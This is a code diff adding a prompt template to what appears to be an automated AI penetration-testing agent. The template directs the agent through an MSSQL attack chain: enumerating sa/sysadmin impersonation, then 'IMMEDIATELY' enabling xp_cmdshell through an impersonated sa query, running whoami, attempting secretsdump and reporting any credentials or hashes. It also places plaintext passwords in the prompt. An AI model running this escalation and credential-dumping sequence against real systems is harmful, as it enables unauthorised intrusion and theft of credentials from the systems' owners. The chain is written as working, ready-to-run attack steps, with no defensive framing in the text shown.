@@ -217,6 +217,50 @@ def generate_prompt_from_task(
         )
 
     if task.task_type == "lateral":
+        action = payload.get("action", "")
+
+        # Special handling for proactive MSSQL enumeration
+        if action == "mssql_enum_impersonation":
+            target = payload.get("target", "")
+            username = payload.get("username", "")
+            password = payload.get("password", "")
+            domain = payload.get("domain", "")
+            base_prompt = (
+                f"**MSSQL IMPERSONATION ENUMERATION**\n\n"
+                f"Target: {target}\n"
+                f"Username: {domain}\\{username}\n"
+                f"Password: {password}\n"
+                f"Task ID: {task.task_id}\n\n"
+                "**OBJECTIVE:** Discover if sa/sysadmin impersonation is possible.\n\n"
+                "**STEP 1: Run impersonation enumeration**\n"
+                "```\n"
+                f"mssql_enum_impersonation(\n"
+                f"    target='{target}',\n"
+                f"    username='{username}',\n"
+                f"    password='{password}',\n"
+                f"    domain='{domain}',\n"
+                "    windows_auth=True\n"
+                ")\n"
+                "```\n\n"
+                "**STEP 2: If sa/sysadmin found, IMMEDIATELY exploit:**\n"
+                "```\n"
+                f"mssql_impersonate(\n"
+                f"    target='{target}',\n"
+                f"    username='{username}',\n"
+                f"    password='{password}',\n"
+                "    impersonate_user='sa',\n"
+                "    query='SELECT SYSTEM_USER; EXEC sp_configure \"xp_cmdshell\", 1; RECONFIGURE;',\n"
+                f"    domain='{domain}',\n"
+                "    windows_auth=True\n"
+                ")\n"
+                "```\n\n"
+                "**STEP 3: With xp_cmdshell, run whoami then attempt secretsdump**\n\n"
+                "Report any credentials or hashes discovered."
+            )
+            state_context = format_state_context(state, "lateral", current_target=target)
+            return base_prompt + state_context
+
+        # Standard lateral movement
         cred_type = "password" if payload.get("password") else "hash"
         cred_value = payload.get("password") or payload.get("hash_value") or "N/A"
         target_host = payload.get("target_host", "")
